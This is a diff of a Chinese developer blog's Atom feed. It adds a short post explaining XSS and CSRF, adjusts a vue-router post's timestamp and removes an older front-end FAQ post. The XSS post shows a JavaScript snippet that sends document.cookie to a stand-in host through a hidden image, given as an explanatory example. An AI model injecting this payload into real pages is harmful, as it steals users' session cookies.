@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://arthas.com.cn/"/>
-  <updated>2019-01-17T14:08:26.417Z</updated>
+  <updated>2019-01-21T13:00:39.221Z</updated>
   <id>http://arthas.com.cn/</id>
   
   <author>
@@ -17,11 +17,36 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>XSS（跨站脚本攻击）和CSRF（跨站请求伪造）</title>
+    <link href="http://arthas.com.cn/2019/01/21/XSS%EF%BC%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89%E5%92%8CCSRF%EF%BC%88%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89/"/>
+    <id>http://arthas.com.cn/2019/01/21/XSS（跨站脚本攻击）和CSRF（跨站请求伪造）/</id>
+    <published>2019-01-21T12:52:26.000Z</published>
+    <updated>2019-01-21T13:00:39.221Z</updated>
+    
+    <content type="html"><![CDATA[<p>XSS是什么？它的全名是：Cross-site scripting，为了和CSS层叠样式表区分所以取名XSS。是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。<br>而CSRF是什么呢？CSRF全名是Cross-site request forgery，是一种对网站的恶意利用，CSRF比XSS更具危险性。</p><p>XSS注入大多数情况下利用了输入框向页面提交恶意代码，比如注入以下代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src=<span class="string">'http://www.xss.com?cookie='</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">img.style.display=<span class="string">'none'</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>].appendChild(img);</span><br></pre></td></tr></table></figure><p>神不知鬼不觉的拿到了cookie数据。</p><p><a href="https://cnodejs.org/topic/50463565329c5139760c34a1" target="_blank" rel="noopener">原文</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;XSS是什么？它的全名是：Cross-site scripting，为了和CSS层叠样式表区分所以取名XSS。是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言
+      
+    
+    </summary>
+    
+      <category term="编程基础" scheme="http://arthas.com.cn/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
+    
+    
+      <category term="安全" scheme="http://arthas.com.cn/tags/%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
     <title>vue-router中import不能使用变量解决办法</title>
     <link href="http://arthas.com.cn/2019/01/16/vue-router%E4%B8%ADimport%E6%97%B6%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8%E5%8F%98%E9%87%8F%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
     <id>http://arthas.com.cn/2019/01/16/vue-router中import时不能使用变量解决办法/</id>
     <published>2019-01-16T09:39:48.000Z</published>
-    <updated>2019-01-17T14:08:26.417Z</updated>
+    <updated>2019-01-21T12:54:42.464Z</updated>
     
     <content type="html"><![CDATA[<p>vue-router中为了实现懒加载组件，需要用这样的写法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  path: <span class="string">'/login'</span>,</span><br><span class="line">  name: <span class="string">'login'</span>,</span><br><span class="line">  component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'@/page/login/login.vue'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但有时候需求会导致需要通过变量指定vue文件路径，从而实现动态加载，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> path = <span class="string">'@/page/login/login.vue'</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  path: <span class="string">'/login'</span>,</span><br><span class="line">  name: <span class="string">'login'</span>,</span><br><span class="line">  component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(path)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是webpack在编译时import()不能使用变量，需要用静态字符串才能正确打包。上面的写法会因找不到文件而报错。</p><p><img src="/images/vue-router1.png" alt="报错"></p><p>但一定要用变量的时候，可以通过字符串模板来提供部分信息给webpack；例如:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> path = <span class="string">'/login/login.vue'</span></span><br><span class="line"></span><br><span class="line">component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">`@/page<span class="subst">$&#123;path&#125;</span>`</span>)</span><br></pre></td></tr></table></figure><p>这样编译时会编译所有./path下的模块，但运行时确定path的值才会加载，从而实现懒加载。</p><p><a href="https://blog.csdn.net/zjcjava/article/details/82179975" target="_blank" rel="noopener">原文</a></p>]]></content>
     
@@ -508,32 +533,6 @@
     
     
       <category term="css" scheme="http://arthas.com.cn/tags/css/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>前端常见问题解答总结</title>
-    <link href="http://arthas.com.cn/2018/03/14/%E5%89%8D%E7%AB%AF%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94%E6%80%BB%E7%BB%93/"/>
-    <id>http://arthas.com.cn/2018/03/14/前端常见问题解答总结/</id>
-    <published>2018-03-14T03:20:37.000Z</published>
-    <updated>2018-03-14T06:23:34.083Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="1、前端性能优化常用的方法"><a href="#1、前端性能优化常用的方法" class="headerlink" title="1、前端性能优化常用的方法"></a>1、前端性能优化常用的方法</h2><ul><li>通过CSS Sprites减少http请求次数，JS、CSS源码压缩、图片大小控制合适；网页Gzip，CDN托管，data缓存 ，增加静态资源服务器。</li><li>避免在页面的主体布局中使用table table要等其中的内容完全下载之后才会显示出来，显示比div+css布局慢。</li><li>使用缓存技术</li></ul><h2 id="2、常见的http状态码"><a href="#2、常见的http状态码" class="headerlink" title="2、常见的http状态码"></a>2、常见的http状态码</h2><table><thead><tr><th>状态码</th><th>说明</th></tr></thead><tbody><tr><td>200</td><td>服务器已成功处理了请求</td></tr><tr><td>301</td><td>请求的文档在其他地方，新的URL在Location头中给出，浏览器应该自动地访问新的URL</td></tr><tr><td>302</td><td>类似于301，但新的URL应该被视为临时性的替代，而不是永久性的</td></tr><tr><td>304</td><td>自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容</td></tr><tr><td>403</td><td>服务器拒绝访问，资源不可用</td></tr><tr><td>404</td><td>请求的资源不存在</td></tr><tr><td>500</td><td>服务器内部错误</td></tr><tr><td>502</td><td>服务器作为网关或者代理时，为了完成请求访问下一个服务器，但该服务器返回了非法的应答</td></tr></tbody></table><h2 id="3、一个div的居中问题"><a href="#3、一个div的居中问题" class="headerlink" title="3、一个div的居中问题"></a>3、一个div的居中问题</h2><p><strong>水平居中</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>垂直居中</strong></p><p>以下均可以实现水平居中的同时垂直居中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid red;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">margin-top</span>: -<span class="number">100px</span>;</span><br><span class="line"><span class="attribute">margin-left</span>: -<span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>对div中的元素水平垂直居中</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">align-items</span>:center;</span><br><span class="line">  <span class="attribute">justify-content</span>:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span> <span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><script async src="//jsfiddle.net/mohong/8u4sxm2a/10/embed/html,css,result/"></script><h2 id="4、外边距叠加"><a href="#4、外边距叠加" class="headerlink" title="4、外边距叠加"></a>4、外边距叠加</h2><p>当两个或者更多垂直外边距相遇时，它们将形成一个外边距，这个外边距的高等于两个发生叠加的外边距的高度中的较大者</p><ul><li>当一个元素包含在另一个元素中时，它们的顶和/或底外边距也会发生叠加</li><li>外边距可以与可以与本身叠加（空元素，有外边距，但没有边框和内边距，顶外边距与底外边距就碰到一起了，它们会发生叠加）</li><li>只有普通文档流中块框的垂直外边距才会发生外边距叠加。行内框，浮动框或者绝对定位框之间的外边距不会叠加</li></ul><h2 id="浮动"><a href="#浮动" class="headerlink" title="浮动"></a>浮动</h2><p>常见的清除浮动的方法</p><ul><li>在最后面增加一个元素，并且对其添加加<code>clear:both</code>属性</li><li>父元素增加<code>overflow:hidden</code>属性</li><li>伪元素<code>:after</code>添加<code>clear:both</code>属性</li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;1、前端性能优化常用的方法&quot;&gt;&lt;a href=&quot;#1、前端性能优化常用的方法&quot; class=&quot;headerlink&quot; title=&quot;1、前端性能优化常用的方法&quot;&gt;&lt;/a&gt;1、前端性能优化常用的方法&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;通过CSS Sprites减少http请
-      
-    
-    </summary>
-    
-      <category term="前端" scheme="http://arthas.com.cn/categories/%E5%89%8D%E7%AB%AF/"/>
-    
-    
-      <category term="问题" scheme="http://arthas.com.cn/tags/%E9%97%AE%E9%A2%98/"/>
     
   </entry>
   
